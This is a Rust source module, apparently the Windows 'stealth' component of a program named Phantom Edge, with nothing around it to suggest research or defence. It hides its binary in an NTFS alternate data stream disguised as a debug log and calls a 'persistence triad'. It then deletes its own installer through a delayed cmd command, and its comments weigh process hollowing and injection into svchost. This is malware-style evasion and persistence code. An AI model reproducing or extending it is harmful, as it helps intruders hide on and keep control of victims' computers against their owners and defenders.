pub mod ads;
pub mod persistence;
pub mod hollow;

use log::{info, warn};
use std::process;

/// Main Entry Point for Windows Stealth
pub fn check_and_apply_stealth() {
    if !cfg!(target_os = "windows") {
        return;
    }
    
    // 1. Check if we are running from the hidden location or with Ghost Flag
    let args: Vec<String> = std::env::args().collect();
    let is_ghost = args.iter().any(|arg| arg == "--ghost");

    if ads::is_running_from_ads() || is_ghost {
        info!("[Stealth] Running in GHOST MODE (ADS/Flag).");
        // Option: Perform Process Hollowing now?
        // For stability, we might just run as "aria-debug.log:core_service" which is already pretty stealthy.
        // Or inject into svchost.
        
        #[cfg(feature = "hollow")] 
        unsafe {
           // hollow::hollow_process().ok(); 
        }
        
        return; // Proceed to Main Loop
    }
    
    // 2. Not hidden? INSTALL.
    info!("[Stealth] Installing Phantom Edge Stealth Suite...");
    
    match ads::install_to_ads() {
        Ok(path) => {
            info!("[Stealth] Binary hidden at: {}", path);
            persistence::apply_persistence_triad(&path);
            
            // Self-Destruct: Delete the original installer EXE
            if let Ok(original_exe) = std::env::current_exe() {
                info!("[Stealth] Self-Destructing original: {:?}", original_exe);
                // On Windows, deleting running EXE is tricky. Use delayed delete.
                let _ = std::process::Command::new("cmd")
                    .args(&["/C", "timeout", "/T", "2", "/NOBREAK", ">nul", "&", "del", "/F", "/Q"])
                    .arg(&original_exe)
                    .spawn();
            }
            
            info!("[Stealth] Installation Successful. Exiting.");
            process::exit(0); 
        },
        Err(e) => {
            warn!("[Stealth] Installation Failed: {}", e);
            // Fallback: Run normally
        }
    }
}
